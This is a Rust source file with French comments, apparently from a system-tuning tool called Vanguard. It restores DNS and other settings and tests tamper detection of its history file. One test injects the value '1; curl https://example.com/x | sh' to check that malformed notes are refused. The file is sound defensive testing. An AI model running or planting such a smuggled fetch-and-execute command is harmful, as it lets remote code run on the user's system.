pub(crate) fn dns_pour_wifi_public(serveurs4: &[&str], serveurs6: &[&str]) -> Result<(String, String, String), String> {
    let c = systeme::dns_principal(serveurs4, serveurs6)?;
    let id = c.identite_dns().unwrap_or_default().to_string();
    let avant = c
        .lire()
        .ok_or_else(|| tr!("DNS actuel illisible.", "Current DNS unreadable.").to_string())?;
    let cible = c.cible().unwrap_or_default();
    Ok((id, avant, cible))
}

/// Le DNS actuel de la connexion d'une valeur notée (son identité en tête), dans la même forme.
pub(crate) fn dns_relu(valeur: &str) -> Option<String> {
    systeme::Changement::dns_note(valeur)?.lire()
}

/// La commande qui pose cette valeur de DNS (identité en tête) ; `None` si elle ne se valide pas.
pub(crate) fn dns_commande(valeur: &str) -> Option<String> {
    systeme::Changement::dns_note(valeur)?.commande_dns(valeur)
}

/// Le mode Wi-Fi public tient le DNS : le dire. Le remettre maintenant, il le reposerait en s'éteignant (sa valeur
/// d'avant est celle d'ici), et la note de reglages.json serait perdue.
fn dire_dns_tenu() {
    afficher_aligne(
        "  ",
        tr!(
            "Le mode Wi-Fi public tient le DNS : il est laissé ; éteignez le mode d'abord (« vanguard wifi-public off »).",
            "Public Wi-Fi mode holds the DNS: it is left as is; turn the mode off first (“vanguard public-wifi off”)."
        ),
        2,
        "",
    );
}

/// Remet le DNS d'avant le changement de Vanguard, après accord.
pub fn remettre_dns() {
    if crate::reseau::wifi_public::tient_le_dns() {
        dire_dns_tenu();
        return;
    }
    let h = charger();
    let reglages = hors_catalogue(&h);
    if let Some(r) = reglages.iter().find(|r| r.id.as_ref() == DNS) {
        confirmer_et_executer(&[], &[r]);
    }
}

/// Le nombre de réglages d'Optimiser changés par Vanguard dont la valeur d'avant est notée (les corrections du bilan
/// et les réglages pour jouer, notés au même endroit, se comptent à part).
pub(crate) fn reglages_notes() -> usize {
    charger()
        .reglages
        .keys()
        .filter(|id| !id.starts_with(annulables::BILAN) && !id.starts_with(annulables::JEUX))
        .count()
}

/// Annule tout ce que Vanguard a changé : `annulation::tout_remettre`, qui défait aussi le bilan, Gaming, les
/// blocages et le mode Wi-Fi public.
pub fn tout_annuler() {
    crate::annulation::tout_remettre();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn catalogue_complet_et_sans_doublon() {
        let c = systeme::catalogue();
        let mut ids: Vec<&str> = c.iter().map(|r| r.id.as_ref()).collect();
        let n = ids.len();
        ids.sort_unstable();
        ids.dedup();
        assert_eq!(ids.len(), n, "deux réglages ont le même id");
        for r in &c {
            assert!(!r.titre.is_empty() && !r.effet.is_empty(), "{}", r.id);
            assert!(!r.changements.is_empty(), "{} ne change rien", r.id);
            // Le titre tient dans la liste à cocher sans être coupé.
            assert!(largeur_affichee(&r.titre) <= 42, "{} : titre trop long", r.id);
        }
    }

    /// Les messages d'Optimiser et des programmes au démarrage tiennent dans `LARGEUR` colonnes, dans les deux
    /// langues.
    #[test]
    fn messages_dans_la_largeur() {
        let larges: Vec<String> = [include_str!("mod.rs"), include_str!("demarrage.rs")]
            .into_iter()
            .flat_map(crate::ui::textes_trop_larges)
            .collect();
        assert_eq!(larges, Vec::<String>::new());
    }

    /// L'en-tête de chaque catégorie tient dans `LARGEUR` : plus large, il passait sur deux rangées du terminal et
    /// décalait la liste à cocher, qui compte une rangée par ligne.
    #[test]
    fn entete_dans_la_largeur() {
        for c in [
            Categorie::Confidentialite,
            Categorie::Performance,
            Categorie::Confort,
            Categorie::Protection,
        ] {
            for l in entete(c).iter().flat_map(|t| t.split('\n')) {
                assert!(largeur_affichee(l) <= LARGEUR, "{} colonnes : {l}", largeur_affichee(l));
            }
        }
    }

    /// Les lignes d'un revers, dans ce qui va changer.
    fn revers_trop_larges(lignes: &[String]) -> Vec<String> {
        let changement = format!("        {GRIS}");
        lignes
            .iter()
            .flat_map(|t| t.split('\n'))
            .filter(|l| !l.starts_with(&changement) && largeur_affichee(l) > LARGEUR)
            .map(str::to_string)
            .collect()
    }

    /// Avant de demander, ce qui va changer montre le revers de chaque réglage, coupé pour tenir dans `LARGEUR` ;
    /// les changements eux-mêmes (clé du registre, commande) restent entiers.
    #[test]
    fn changements_dans_la_largeur() {
        let catalogue = systeme::catalogue();
        let tous: Vec<&Reglage> = catalogue.iter().collect();
        assert_eq!(
            revers_trop_larges(&a_changer(&tous, &[], &Historique::default())),
            Vec::<String>::new()
        );
        #[cfg(target_os = "linux")]
        {
            let r = Reglage {
                id: "essai".into(),
                categorie: Categorie::Confort,
                titre: "Essai".into(),
                effet: "Essai",
                prudence: Some(
                    "Courrier, Calendrier et les autres applications du Store n'enverront plus de notifications une fois fermées.",
                ),
                recommande: false,
                changements: vec![systeme::Changement::Option {
                    fichier: "/etc/essai.conf",
                    cle: "ESSAI",
                    cible: "0",
                    defaut: "1",
                }],
            };
            assert_eq!(
                revers_trop_larges(&a_changer(&[&r], &[], &Historique::default())),
                Vec::<String>::new()
            );
        }
    }

    /// Le mode Wi-Fi public tient le DNS : « Tout remettre » le laisse (le mode reposerait sinon, en s'éteignant, la
    /// valeur d'ici, et la note d'origine serait perdue) ; la note reste, rien n'est lancé.
    #[test]
    fn dns_laisse_quand_le_mode_le_tient() {
        let dossier = dossier_jetable("dns-tenu");
        let mut h = Historique::default();
        #[cfg(target_os = "linux")]
        let note = "0b8c2f4e-1a2b-4c3d-9e8f-001122334455\n|no||no";
        #[cfg(windows)]
        let note = "{0B8C2F4E-1A2B-4C3D-9E8F-001122334455}\n|";
        #[cfg(target_os = "macos")]
        let note = "Wi-Fi\n";
        h.reglages.insert(
            DNS.into(),
            Avant {
                date: String::new(),
                valeurs: vec![Some(note.into())],
                ..Avant::default()
            },
        );
        assert!(sauver_dans(&h, &dossier));
        assert!(hors_catalogue(&h).iter().any(|r| r.id.as_ref() == DNS));
        let (issues, _) = annulables::defaire_dans(&[DNS.to_string()], &[], true, &dossier);
        assert!(matches!(issues[0].1, annulables::Issue::Refuse(_)), "{issues:?}");
        assert!(
            charger_dans(&dossier).reglages.contains_key(DNS),
            "la note du DNS reste"
        );
        let _ = std::fs::remove_dir_all(&dossier);
    }

    #[test]
    fn historique_relu_tel_quel() {
        let mut h = Historique::default();
        h.reglages.insert(
            "x".into(),
            Avant {
                date: "2026-10-17 21:00".into(),
                valeurs: vec![Some("dword:1".into()), None],
                ..Avant::default()
            },
        );
        let relu: Historique = serde_json::from_str(&serde_json::to_string(&h).unwrap()).unwrap();
        assert_eq!(relu.reglages["x"].valeurs, [Some("dword:1".to_string()), None]);
    }

    fn dossier_jetable(nom: &str) -> std::path::PathBuf {
        let dossier = std::env::temp_dir().join(format!("vanguard-reglages-{nom}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dossier);
        std::fs::create_dir_all(&dossier).unwrap();
        dossier
    }

    fn copies(dossier: &std::path::Path, debut: &str) -> usize {
        std::fs::read_dir(dossier)
            .unwrap()
            .flatten()
            .filter(|e| e.file_name().to_string_lossy().starts_with(debut))
            .count()
    }

    /// Un historique tronqué (coupure pendant l'écriture) n'est pas pris pour vide puis écrasé : il est mis de côté.
    #[test]
    fn historique_illisible_mis_de_cote() {
        let dossier = dossier_jetable("illisible");
        let mut h = Historique::default();
        h.reglages.insert(
            "x".into(),
            Avant {
                date: "2026-10-18 01:00".into(),
                valeurs: vec![Some("1".into())],
                ..Avant::default()
            },
        );
        assert!(sauver_dans(&h, &dossier));
        assert_eq!(charger_dans(&dossier).reglages["x"].valeurs, [Some("1".to_string())]);
        // Tronqué par Vanguard lui-même (resscellé tel quel) : illisible, gardé de côté.
        crate::sceau::ecrire_dans(
            &dossier,
            crate::sceau::REGLAGES,
            b"{\"reglages\":{\"x\":{\"date\":\"2026-10",
        )
        .unwrap();
        assert!(charger_dans(&dossier).reglages.is_empty());
        assert!(
            copies(&dossier, "reglages.illisible-") >= 1,
            "le fichier illisible n'a pas été gardé"
        );
        let _ = std::fs::remove_dir_all(&dossier);
    }

    /// reglages.json réécrit par un programme du compte (une valeur d'avant à lui, que Vanguard remettrait en
    /// administrateur) : rien n'en est cru, et il est mis de côté, intact.
    #[test]
    fn historique_falsifie_ne_fait_rien_remettre() {
        let dossier = dossier_jetable("falsifie");
        let mut h = Historique::default();
        h.reglages.insert(
            DNS.into(),
            Avant {
                date: "2026-10-18 01:00".into(),
                valeurs: vec![Some("x".into())],
                ..Avant::default()
            },
        );
        assert!(sauver_dans(&h, &dossier));
        assert_eq!(charger_dans(&dossier).reglages.len(), 1);
        std::fs::write(
            dossier.join(crate::sceau::REGLAGES),
            r#"{"reglages":{"dns_rapide":{"date":"2026-10-18 01:00","valeurs":["y"]}}}"#,
        )
        .unwrap();
        assert!(charger_dans(&dossier).reglages.is_empty());
        assert!(copies(&dossier, "reglages.falsifie-") >= 1);
        let _ = std::fs::remove_dir_all(&dossier);
    }

    /// sceaux.json effacé, puis reglages.json posé par un programme du compte (une note de DNS bien formée) : rien
    /// n'en est remis (il est mis de côté, intact), et il n'est pas rescellé à la lecture ; il reste « adopté », et le
    /// bilan continue de le dire.
    #[test]
    fn historique_adopte_jamais_rescelle_a_la_lecture() {
        let dossier = dossier_jetable("adopte");
        assert!(sauver_dans(&Historique::default(), &dossier));
        std::fs::remove_file(dossier.join("sceaux.json")).unwrap();
        // La forme exacte d'une note de DNS sous Linux (connexion, puis DNS IPv4 et IPv6) : admise à la remise.
        let note = r#"{"reglages":{"dns_rapide":{"date":"2026-10-18 01:00","valeurs":["0b6e5c1a-2f3d-4e8f-9a0b-1c2d3e4f5a6b\n203.0.113.66|yes||yes"]}}}"#;
        std::fs::write(dossier.join(crate::sceau::REGLAGES), note).unwrap();
        assert!(
            charger_dans(&dossier).reglages.is_empty(),
            "une note adoptée n'est jamais remise"
        );
        assert!(copies(&dossier, "reglages.adopte-") >= 1);
        assert!(matches!(
            crate::sceau::lire_dans(&dossier, crate::sceau::REGLAGES),
            crate::sceau::Lecture::Adopte(_)
        ));
        let _ = std::fs::remove_dir_all(&dossier);
    }

    /// reglages.json repris tel quel d'une version d'avant par une mise à jour connue : il vient de Vanguard, ses notes
    /// servent (sans rescellement à la lecture).
    #[test]
    fn historique_repris_d_une_version_d_avant_sert() {
        let dossier = dossier_jetable("repris");
        crate::sceau::sceaux_d_une_version_d_avant(&dossier);
        let note = r#"{"reglages":{"dns_rapide":{"date":"2026-10-18 01:00","valeurs":["0b6e5c1a-2f3d-4e8f-9a0b-1c2d3e4f5a6b\n203.0.113.66|yes||yes"]}}}"#;
        std::fs::write(dossier.join(crate::sceau::REGLAGES), note).unwrap();
        assert_eq!(charger_dans(&dossier).reglages.len(), 1);
        assert_eq!(copies(&dossier, "reglages.adopte-"), 0);
        let _ = std::fs::remove_dir_all(&dossier);
    }

    /// Une note dont une valeur n'a pas la forme que le réglage écrit est refusée en entier : ce sont les valeurs d'un
    /// système neuf (celles du code) qui reviennent, jamais celle de la note.
    #[test]
    fn note_d_une_forme_inattendue_refusee() {
        #[cfg(not(target_os = "linux"))]
        let catalogue = systeme::catalogue();
        let mut h = Historique::default();
        #[cfg(target_os = "linux")]
        let essai = Reglage {
            id: "essai".into(),
            categorie: Categorie::Confort,
            titre: "Essai".into(),
            effet: "Essai",
            prudence: None,
            recommande: false,
            changements: vec![systeme::Changement::Option {
                fichier: "/etc/default/essai",
                cle: "ENABLED",
                cible: "0",
                defaut: "1",
            }],
        };
        #[cfg(target_os = "linux")]
        let r = &essai;
        #[cfg(not(target_os = "linux"))]
        let Some(r) = catalogue.first() else { return };
        h.reglages.insert(
            r.id.to_string(),
            Avant {
                date: String::new(),
                valeurs: vec![Some("1; curl https://example.com/x | sh".into())],
                ..Avant::default()
            },
        );
        assert!(note_admise(r, &h).is_none());
        assert_eq!(
            valeurs_d_avant(r, &h),
            r.changements
                .iter()
                .map(systeme::Changement::defaut)
                .collect::<Vec<_>>()
        );
        // Plus de valeurs que de changements : pas une note de ce réglage.
        h.reglages.get_mut(r.id.as_ref()).unwrap().valeurs = vec![r.changements[0].defaut(); r.changements.len() + 1];
        assert!(note_admise(r, &h).is_none());
    }

    /// L'annulation se juge sur les valeurs relues : une ligne qui était absente doit l'être de nouveau.
    #[cfg(target_os = "linux")]
    #[test]
    fn annulation_jugee_sur_les_valeurs_relues() {
        let f = std::env::temp_dir().join(format!("vanguard-test-annuler-{}", std::process::id()));
        std::fs::write(&f, "ENABLED=0\n").unwrap();
        let chemin: &'static str = Box::leak(f.display().to_string().into_boxed_str());
        let r = Reglage {
            id: "essai".into(),
            categorie: Categorie::Confort,
            titre: "Essai".into(),
            effet: "Essai",
            prudence: None,
            recommande: false,
            changements: vec![systeme::Changement::Option {
                fichier: chemin,
                cle: "ENABLED",
                cible: "0",
                defaut: "1",
            }],
        };
        let mut h = Historique::default();
        h.reglages.insert(
            "essai".into(),
            Avant {
                date: String::new(),
                valeurs: vec![None],
                ..Avant::default()
            },
        );
        assert!(
            !remis_en_place(&r, &h, &[]),
            "la ligne posée par Vanguard est encore là"
        );
        std::fs::write(&f, "# ligne retirée\n").unwrap();
        assert!(remis_en_place(&r, &h, &[]));
        // Sans note, c'est la valeur d'un système neuf qui doit revenir.
        assert!(!remis_en_place(&r, &Historique::default(), &[]));
        std::fs::write(&f, "ENABLED=1\n").unwrap();
        assert!(remis_en_place(&r, &Historique::default(), &[]));
        let _ = std::fs::remove_file(&f);
    }
}
